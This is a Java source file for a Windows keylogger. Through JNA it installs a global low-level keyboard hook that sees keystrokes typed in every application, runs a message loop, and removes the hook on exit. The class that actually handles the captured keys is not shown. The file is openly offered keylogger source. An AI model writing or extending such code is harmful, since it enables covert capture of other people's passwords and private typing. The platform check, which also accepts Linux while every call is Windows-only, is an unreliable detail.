package uk.co.baconi.keylogger;

import com.sun.jna.Platform;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef.HMODULE;
import com.sun.jna.platform.win32.WinUser;
import com.sun.jna.platform.win32.WinUser.HHOOK;
import com.sun.jna.platform.win32.WinUser.MSG;
import uk.co.baconi.keylogger.hooks.WindowsKeyboardHook;
import uk.co.baconi.keylogger.hooks.WindowsKeyboardHookParent;

public class WindowsKeyLogger implements WindowsKeyboardHookParent {
    private static final int TEN = 10;
    private static final int ZERO = 0;
    private static final int MINUS_ONE = -1;

    private static volatile boolean quit;
    private final HHOOK hhk;

    public static void main(final String[] args) {
        new WindowsKeyLogger().start();
    }

    public WindowsKeyLogger() {
        if (!Platform.isWindows() && !Platform.isLinux()) {
            System.err.println("This application only supports Windows or Linux.");
            throw new RuntimeException("This application only supports Windows or Linux.");
        }
        final HMODULE hMod = Kernel32.INSTANCE.GetModuleHandle(null);
        final WindowsKeyboardHook keyboardHook = new WindowsKeyboardHook(this);
        hhk = User32.INSTANCE.SetWindowsHookEx(WinUser.WH_KEYBOARD_LL, keyboardHook, hMod, ZERO);
    }

    private void start() {
        new Thread() {
            @Override
            public void run() {
                while (!quit) {
                    try {
                        Thread.sleep(TEN);
                    } catch (final Exception e) {
                    }
                }
                User32.INSTANCE.UnhookWindowsHookEx(hhk);
                System.exit(ZERO);
            }
        }.start();

        int result;
        final MSG msg = new MSG();

        while ((result = User32.INSTANCE.GetMessage(msg, null, ZERO, ZERO)) != ZERO) {
            if (result == MINUS_ONE) {
                break;
            } else {
                User32.INSTANCE.TranslateMessage(msg);
                User32.INSTANCE.DispatchMessage(msg);
            }
        }

        User32.INSTANCE.UnhookWindowsHookEx(hhk);
    }

    @Override
    public HHOOK getHHOOK() {
        return hhk;
    }

    @Override
    public void quit() {
        quit = true;
    }
}
